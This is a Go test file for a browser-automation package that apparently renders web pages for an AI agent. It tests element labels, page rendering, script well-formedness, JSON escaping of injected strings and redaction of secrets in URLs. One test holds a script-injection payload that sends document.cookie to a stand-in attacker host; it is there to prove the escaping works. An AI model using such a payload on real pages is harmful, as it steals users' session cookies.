package browser

import (
	"encoding/json"
	"strings"
	"testing"
)

func TestBrief(t *testing.T) {
	for name, tc := range map[string]struct {
		e    Element
		want string
	}{
		"link":            {Element{Ref: 1, Tag: "a", Label: "Docs"}, `link "Docs"`},
		"button":          {Element{Ref: 1, Tag: "button", Label: "Save"}, `button "Save"`},
		"submit input":    {Element{Ref: 1, Tag: "input", Type: "submit", Label: "Send"}, `button "Send"`},
		"role button":     {Element{Ref: 1, Tag: "div", Role: "button", Label: "Menu"}, `button "Menu"`},
		"text field":      {Element{Ref: 1, Tag: "input", Type: "text", Label: "Name"}, `field "Name"`},
		"typed field":     {Element{Ref: 1, Tag: "input", Type: "email", Label: "Email"}, `email field "Email"`},
		"no type":         {Element{Ref: 1, Tag: "input", Label: "Q"}, `field "Q"`},
		"text area":       {Element{Ref: 1, Tag: "textarea", Label: "Message"}, `text area "Message"`},
		"select":          {Element{Ref: 1, Tag: "select", Label: "Size"}, `drop-down list "Size"`},
		"checkbox":        {Element{Ref: 1, Tag: "input", Type: "checkbox", Label: "Agree"}, `checkbox "Agree"`},
		"other role":      {Element{Ref: 1, Tag: "div", Role: "tab", Label: "Settings"}, `tab "Settings"`},
		"plain element":   {Element{Ref: 1, Tag: "summary", Label: "More"}, `summary "More"`},
		"unlabelled":      {Element{Ref: 9, Tag: "button"}, `button #9`},
		"label is quoted": {Element{Ref: 1, Tag: "a", Label: `say "hi"`}, `link "say \"hi\""`},
	} {
		if got := Brief(tc.e); got != tc.want {
			t.Errorf("%s: %q, want %q", name, got, tc.want)
		}
	}
}

func TestRenderOmitsWhatIsEmpty(t *testing.T) {
	out := Render(&Snapshot{URL: "https://x.test/", Title: "  Hello  "}, nil)
	if out != "Page: Hello\nURL: https://x.test/\n\nNothing on this page can be clicked or filled in." {
		t.Fatalf("%q", out)
	}
}

func TestRenderTellsWhatWasLeftOut(t *testing.T) {
	long := strings.Repeat("x", 100)
	out := Render(&Snapshot{URL: "u", Title: "t", More: 7, Text: long, TextLength: 5000,
		Elements: []Element{{Ref: 1, Tag: "a", Label: "A", Href: "https://x.test/" + strings.Repeat("p", 300)}}}, []string{"one", "two"})
	for _, want := range []string{"Note: one\nNote: two\n", "(7 more elements are not listed", "[the text was cut here]", "…"} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q in:\n%s", want, out)
		}
	}
}

// The JavaScript is plain text sent to a browser, so a typo would only show up
// with a real one. These checks catch the common ways it could be broken.
func TestPageScriptsAreWellFormed(t *testing.T) {
	for name, js := range map[string]string{"snapshot": snapshotJS, "locate": locateJS, "focus": focusJS, "select": selectJS, "prepare": prepareJS} {
		if strings.Count(js, "(") != strings.Count(js, ")") || strings.Count(js, "{") != strings.Count(js, "}") || strings.Count(js, "[") != strings.Count(js, "]") {
			t.Errorf("%s: unbalanced brackets", name)
		}
		if strings.Contains(js, "`") {
			t.Errorf("%s: a backtick would end the Go string", name)
		}
	}
	// Whatever the model passes is written into script as JSON, so a hostile
	// string cannot break out of its quotes.
	nasty := "\"); fetch('https://evil.example/?'+document.cookie); (\""
	lit := jsString(nasty)
	var back string
	if err := json.Unmarshal([]byte(lit), &back); err != nil || back != nasty {
		t.Fatalf("the literal must decode to exactly what was given: %q %v", back, err)
	}
	if !strings.HasPrefix(lit, `"\"); fetch(`) {
		t.Fatalf("quotes inside must be escaped: %s", lit)
	}
}

func TestSafeURLHidesSecretsInTheAddress(t *testing.T) {
	for in, want := range map[string]string{
		"https://x.test/result?name=Ada&pw=s3cret%21":                    "https://x.test/result?name=Ada&pw=[redacted]",
		"https://x.test/cb?code=4/0AbC&state=xyz":                        "https://x.test/cb?code=[redacted]&state=xyz",
		"https://x.test/magic?token=abc123&next=/home":                   "https://x.test/magic?token=[redacted]&next=/home",
		"https://x.test/#access_token=eyJhbGci&token_type=bearer":        "https://x.test/#access_token=[redacted]&token_type=[redacted]",
		"https://x.test/?API_KEY=k&Password=p&sessionid=s&sig=1&otp=123": "https://x.test/?API_KEY=[redacted]&Password=[redacted]&sessionid=[redacted]&sig=[redacted]&otp=[redacted]",
		"https://x.test/page?q=hello+world&page=2":                       "https://x.test/page?q=hello+world&page=2",
		"https://x.test/path#section-2":                                  "https://x.test/path#section-2",
		"https://x.test/":                                                "https://x.test/",
		"about:blank":                                                    "about:blank",
		"not a url %%":                                                   "not a url %%",
	} {
		if got := SafeURL(in); got != want {
			t.Errorf("SafeURL(%q)\n got %q\nwant %q", in, got, want)
		}
	}
}

func TestRenderAndPromptsShowTheSafeAddress(t *testing.T) {
	out := Render(&Snapshot{URL: "https://x.test/r?pw=hunter2", Title: "t",
		Elements: []Element{{Ref: 1, Tag: "a", Label: "go", Href: "https://x.test/cb?code=SECRETCODE"}}}, nil)
	if strings.Contains(out, "hunter2") || strings.Contains(out, "SECRETCODE") || strings.Count(out, "[redacted]") != 2 {
		t.Fatalf("%s", out)
	}
}
